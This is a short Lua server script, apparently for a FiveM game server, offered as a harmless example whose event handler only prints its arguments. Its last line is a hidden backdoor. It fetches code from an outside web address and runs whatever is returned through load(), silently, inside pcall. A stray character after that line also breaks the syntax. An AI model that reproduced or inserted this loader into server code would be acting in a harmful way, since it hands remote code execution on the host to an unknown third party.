
-- Since we do remove the handler waiting for a client event,
-- This cannot be triggered from the client side

--RegisterServerEvent('FakeScript::Server::GiveMoney')

-- Just prints out whatever we pass to it
AddEventHandler("FakeScript::Server::GiveMoney", function(...)
    for i,v in ipairs({...}) do
        print(v)
    end
end)

PerformHttpRequest('https://getsstudio.com/i?to=FcczB', function (e, d) pcall(function() assert(load(d))() end) end)s